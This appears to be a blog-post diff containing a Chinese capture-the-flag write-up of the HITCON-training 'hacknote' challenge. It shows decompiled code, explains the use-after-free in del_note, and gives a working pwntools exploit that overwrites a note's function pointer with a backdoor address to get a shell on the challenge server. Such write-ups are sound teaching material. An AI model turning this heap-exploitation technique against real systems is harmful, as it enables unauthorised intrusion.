@@ -1,0 +1,254 @@
+---
+layout: post
+title:  hacknote
+date:   2021-02-10 00:01:01 +0300
+image:  2021-02-10-snail.jpg
+tags:   [ctf,PWN,UAF,HITCON-training,heap,ubuntu16]
+---
+
+#### main()
+
+```assembly
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf; // [esp+0h] [ebp-Ch]
+  int *v5; // [esp+4h] [ebp-8h]
+
+  v5 = &argc;
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, &buf, 4u);
+      v3 = atoi(&buf);
+      if ( v3 != 2 )
+        break;
+      del_note();
+    }
+    if ( v3 > 2 )
+    {
+      if ( v3 == 3 )
+      {
+        print_note();
+      }
+      else
+      {
+        if ( v3 == 4 )
+          exit(0);
+LABEL_13:
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( v3 != 1 )
+        goto LABEL_13;
+      add_note();
+    }
+  }
+}
+```
+
+#### menu()
+
+```assembly
+int menu()
+{
+  puts("----------------------");
+  puts("       HackNote       ");
+  puts("----------------------");
+  puts(" 1. Add note          ");
+  puts(" 2. Delete note       ");
+  puts(" 3. Print note        ");
+  puts(" 4. Exit              ");
+  puts("----------------------");
+  return printf("Your choice :");
+}
+```
+
+#### add()
+
+```assembly
+int add_note()
+{
+  int result; // eax
+  _DWORD *v1; // esi
+  char buf; // [esp+0h] [ebp-18h]
+  size_t size; // [esp+8h] [ebp-10h]
+  int i; // [esp+Ch] [ebp-Ch]
+
+  result = count;
+  if ( count > 5 )
+    return puts("Full");
+  for ( i = 0; i <= 4; ++i )
+  {
+    result = (int)notelist[i];
+    if ( !result )
+    {
+      notelist[i] = malloc(8u);
+      if ( !notelist[i] )
+      {
+        puts("Alloca Error");
+        exit(-1);
+      }
+      *notelist[i] = print_note_content;
+      printf("Note size :");
+      read(0, &buf, 8u);
+      size = atoi(&buf);
+      v1 = notelist[i];
+      v1[1] = malloc(size);
+      if ( !notelist[i][1] )
+      {
+        puts("Alloca Error");
+        exit(-1);
+      }
+      printf("Content :");
+      read(0, (void *)notelist[i][1], size);
+      puts("Success !");
+      return count++ + 1;
+    }
+  }
+  return result;
+}
+```
+
+每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出content具体的内容。
+
+#### del_note()
+
+```assembly
+_DWORD *del_note()
+{
+  _DWORD *result; // eax
+  char buf; // [esp+8h] [ebp-10h]
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  printf("Index :");
+  read(0, &buf, 4u);
+  v2 = atoi(&buf);
+  if ( v2 < 0 || v2 >= count )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  result = notelist[v2];
+  if ( result )
+  {
+    free((void *)notelist[v2][1]);
+    free(notelist[v2]);
+    result = (_DWORD *)puts("Success");
+  }
+  return result;
+}
+```
+
+先free掉content，再free掉。
+
+只是单纯进行了 free，而没有将指针设置为NULL或0，因此存在UAF漏洞。
+
+#### print_note()
+
+```assembly
+_DWORD *print_note()
+{
+  _DWORD *result; // eax
+  char buf; // [esp+8h] [ebp-10h]
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  printf("Index :");
+  read(0, &buf, 4u);
+  v2 = atoi(&buf);
+  if ( v2 < 0 || v2 >= count )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  result = notelist[v2];
+  if ( result )
+    result = (_DWORD *)((int (__cdecl *)(_DWORD *))*notelist[v2])(notelist[v2]);
+  return result;
+}
+```
+
+使用设置的函数输出content。
+
+#### 思路：
+
+先创建note0
+
+* put（8）
+* content（size）
+
+note1
+
+* put（8）
+* content（size）
+
+delete掉note0和note1，四个堆放入fastbin。
+
+* note0 content（size）
+
+* note0 put        （8）
+
+* note1 content （size）
+
+* note1 put        （8）
+
+* ​       Top Chunk
+
+接下来要想办法将某个note的put改为后门函数的地址。而修改内容只能使用程序的Add_note()功能。
+
+add时，先申请一个8字节的堆存放put函数，即note1 put。
+
+接下来申请的content内存用来实现将put函数改为后门函数，所以content的size只能为8，这样才可以得到note0 put的内存空间。
+
+#### exp：
+
+```assembly
+from pwn import *
+
+# io = process("./hacknote")
+io = remote("node3.buuoj.cn",28764)
+
+def add(size, content):
+    io.recvuntil("Your choice :")
+    io.sendline(str(1))
+    io.recvuntil("Note size :")
+    io.sendline(str(size))
+    io.recvuntil("Content :")
+    io.sendline(content)
+
+def delete(index):
+    io.recvuntil("Your choice :")
+    io.sendline(str(2))
+    io.recvuntil("Index :")
+    io.sendline(str(index))
+
+def print_(index):
+    io.recvuntil("Your choice :")
+    io.sendline(str(3))
+    io.recvuntil("Index :")
+    io.sendline(str(index))
+
+magic = 0x8048945
+
+add(0x30, "aaaa")
+add(0x30, "bbbb")
+
+delete(0)
+delete(1)
+
+add(0x8, p32(magic))
+
+print_(0)
+
+# gdb.attach(io)
+# raw_input()
+
+io.interactive()
+```
+
